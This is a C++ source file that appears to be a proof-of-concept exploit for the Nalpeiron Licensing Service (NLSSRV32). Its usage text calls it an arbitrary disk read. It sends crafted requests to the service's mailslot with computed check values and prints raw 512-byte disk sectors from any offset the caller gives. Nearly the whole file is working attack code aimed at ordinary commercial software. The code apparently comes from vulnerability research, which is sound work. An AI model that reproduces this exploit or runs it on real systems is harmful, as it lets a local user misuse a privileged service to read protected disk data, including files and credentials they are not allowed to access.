// MailOrder.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

#define CALL_READ 0x12182003
#define CALL_READ_B 0x12182006

#define SEND_SIZE 0x220

struct ServiceRequest {
	DWORD call;
	DWORD pid;
	DWORD pre_check;
	DWORD post_check;
	DWORD drive;
	DWORD search_bytes;
	DWORD low_offset;
	DWORD high_offset;
	BYTE data[0x200];
};

struct ServiceResponse {
	DWORD echo;
	DWORD result;
	BYTE data[0x208];
};


BOOL send_and_recieve(LPVOID inBuffer, LPVOID outBuffer)
{
	DWORD bytesWritten;
	CHAR slotName[MAX_PATH];

	DWORD pid = GetCurrentProcessId();
	sprintf_s((LPSTR)&slotName, MAX_PATH, "%s%d", "\\\\.\\mailslot\\nlsX86ccMailslot", pid);
	HANDLE outSlot = CreateMailslotA((LPSTR)&slotName, 0, 0xFFFFFFFF, 0);
	if (outSlot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to open our mailslot.\n");
		return FALSE;
	}	

	HANDLE inSlot = CreateFileA("\\\\.\\mailslot\\nlsX86ccMailslot", 0x40000000u, 1u, 0, 3u, 0x80u, 0);
	if (inSlot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to open their mailslot.\n");
		return FALSE;
	}

	if (!WriteFile(inSlot, inBuffer, SEND_SIZE, &bytesWritten, 0)) {
		printf("[!] Failed to write message.\n");
		return FALSE;
	}

	if (!ReadFile(outSlot, outBuffer, SEND_SIZE, &bytesWritten, 0)) {
		printf("[!] Failed to read message.\n");
		return FALSE;
	}

	CloseHandle(inSlot);
	CloseHandle(outSlot);

	return TRUE;
}

int get_rand(int v1, int v2)
{
	_SYSTEMTIME SystemTime;
	UINT seed;

	if (v2 < v1) return -1;
	if (v1 == v2) return -2;

	GetSystemTime(&SystemTime);
	seed = SystemTime.wSecond + SystemTime.wMinute + SystemTime.wMilliseconds;

	srand(seed);

	return v1 + rand() % (v2 - v1 + 1);
}

unsigned int get_check_val(int in)
{
	DWORD out;

	out = GetCurrentProcessId();
	if (out * in > 0x91D5)
		return out * in % 0x91D5;
	if (out * in > 0x6ABD)
		return out * in % 0x6ABD;
	if (out * in > 0x625)
		return out * in % 0x625;
	if (out * in <= 0x89)
		return out * in % 0x26;
	return out * in % 0x89;
}

// https://stackoverflow.com/questions/10599068/how-do-i-print-bytes-as-hexadecimal
static void _print_as_hex(PBYTE buf, size_t buf_len)
{
	size_t i = 0;
	for (i = 0; i < buf_len; ++i)
		fprintf(stdout, "%02X%s", buf[i],
		(i + 1) % 32 == 0 ? "\r\n" : " ");

	fprintf(stdout, "\r\n\r\n");
}

void _usage(int argc, WCHAR* argv[]) {
	wprintf(L"\nNalpeiron Licensing Service (NLSSRV32) arbitrary disk read\n");
	wprintf(L"Reads 512 bytes from the primary disk at a specified offset\n\n");
	wprintf(L"Usage:\n\n%s <drive_letter> <offset>\n\n", argv[0]);
}

int wmain(int argc, WCHAR* argv[])
{
	if (argc != 3) {
		_usage(argc, argv);
		return 1;
	}

	ServiceRequest request = { 0 };
	ServiceResponse response = { 0 };

	request.call = CALL_READ_B;
	request.pid = GetCurrentProcessId();
	request.pre_check = get_rand(100, 1000);
	request.post_check = get_check_val(request.pre_check);

	request.drive = argv[1][0];
	request.low_offset = _wtoi(argv[2]);

	if (request.low_offset != 0 && (request.low_offset % 512 != 0)) {
		printf("[!] Offset needs to be a multiple of 512");
		return 1;
	}

	printf("[+] Requesting sector from %c: at offset %d ...\n", request.drive, request.low_offset);
	

	if (!send_and_recieve(&request, &response)) {
		return 1;
	}

	if (response.result != 0) {
		printf("[!] Service returned code: %d\n\n", response.result);
		return 1;
	}

	printf("[+] Drive data [hex]:\n\n");
	_print_as_hex(response.data, 512);

	return 0;
}